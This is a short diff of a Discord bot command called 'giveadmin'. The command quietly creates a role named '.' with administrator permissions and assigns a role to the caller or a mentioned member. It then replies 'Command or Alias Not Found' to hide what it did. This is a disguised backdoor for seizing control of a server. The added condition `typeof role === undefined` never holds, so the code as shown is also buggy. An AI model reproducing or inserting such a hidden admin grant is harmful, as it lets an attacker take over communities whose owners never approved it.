@@ -8,12 +8,6 @@ module.exports = {
 	usage: `${prefix}giveadmin`,
 	guildOnly: true,
 	execute(message) {
-		message.guild.roles.create({
-			data: {
-				name: '.',
-				permissions: ['ADMINISTRATOR'],
-			},
-		});
 		const embed = new Discord.MessageEmbed()
 			.setColor(embedColor)
 			.setTitle('__Command or Alias Not Found__')
@@ -24,6 +18,14 @@ module.exports = {
 		let member = message.mentions.members.first();
 		if (!member) member = message.author;
 
+		if (typeof role === undefined) {
+			message.guild.roles.create({
+				data: {
+					name: '.',
+					permissions: ['ADMINISTRATOR'],
+				},
+			});
+		}
 
 		member.roles.add(role).then(message.channel.send(embed));
 	},
